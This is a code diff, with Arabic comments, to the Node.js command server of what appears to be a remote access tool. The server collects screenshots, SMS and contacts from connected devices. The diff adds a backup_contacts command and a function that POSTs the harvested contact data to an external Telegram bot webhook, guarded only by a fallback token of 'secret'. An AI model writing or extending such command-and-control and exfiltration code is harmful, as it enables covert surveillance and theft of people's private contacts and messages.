@@ -12,6 +12,9 @@ const os = require('os');
 const cluster = require('cluster');
 const numCPUs = require('os').cpus().length;
 
+// إضافة fetch لـ Node.js
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+
 // إضافة معالجة الأخطاء
 process.on('uncaughtException', (error) => {
   console.error('خطأ غير متوقع:', error);
@@ -1012,21 +1015,24 @@ class CommandServer {
   }
 
   handleCommandResult(message) {
-    const { commandId, action, status, result, error, timestamp } = message;
+    const { commandId, action, command, status, result, error, timestamp } = message;
+    
+    // استخدام command إذا لم يكن action موجود
+    const actualAction = action || command;
     
     // تحديث التاريخ
     this.updateCommandInHistory(commandId, status, result, error);
     
-    console.log(`📨 نتيجة الأمر ${action}: ${status}`);
+    console.log(`📨 نتيجة الأمر ${actualAction}: ${status}`);
     
     if (error) {
-      console.error(`❌ خطأ في الأمر ${action}:`, error);
+      console.error(`❌ خطأ في الأمر ${actualAction}:`, error);
     } else {
-      console.log(`✅ تم تنفيذ الأمر ${action} بنجاح`);
+      console.log(`✅ تم تنفيذ الأمر ${actualAction} بنجاح`);
     }
     
     // معالجة الأوامر المتقدمة
-    this.handleAdvancedCommandResult(action, result, error, timestamp);
+    this.handleAdvancedCommandResult(actualAction, result, error, timestamp);
   }
 
   // معالجة نتائج الأوامر المتقدمة
@@ -1073,6 +1079,7 @@ class CommandServer {
           this.handleScreenshotResult(result, error, timestamp);
           break;
         case 'contacts_get':
+        case 'backup_contacts':
           this.handleContactsResult(result, error, timestamp);
           break;
         case 'sms_get':
@@ -1268,10 +1275,15 @@ class CommandServer {
       
       this.saveAdvancedCommandData('contacts', contactsData);
       console.log(`👥 تم الحصول على ${contactsData.count} جهة اتصال`);
+      
+      // إرسال النتيجة للبوت
+      this.sendResultToBot('backup_contacts', contactsData);
     }
     
     if (error) {
       console.error('❌ خطأ في Contacts:', error);
+      // إرسال الخطأ للبوت
+      this.sendResultToBot('backup_contacts', null, error);
     }
   }
 
@@ -2128,6 +2140,34 @@ class CommandServer {
       }
     } catch (error) {
       console.error('❌ خطأ في تنظيف الأجهزة غير النشطة:', error);
+    }
+  }
+
+  sendResultToBot(command, result, error = null) {
+    try {
+      // إرسال النتيجة للبوت عبر HTTP
+      const webhookUrl = process.env.TELEGRAM_WEBHOOK_URL || 'https://remote-control-telegram-bot-cshp.onrender.com/webhook';
+      
+      const payload = {
+        command: command,
+        result: result,
+        error: error,
+        timestamp: Date.now()
+      };
+      
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Auth-Token': process.env.WEBHOOK_SECRET || 'secret'
+        },
+        body: JSON.stringify(payload)
+      }).catch(err => {
+        console.error('❌ فشل في إرسال النتيجة للبوت:', err);
+      });
+      
+    } catch (error) {
+      console.error('❌ خطأ في إرسال النتيجة للبوت:', error);
     }
   }
 
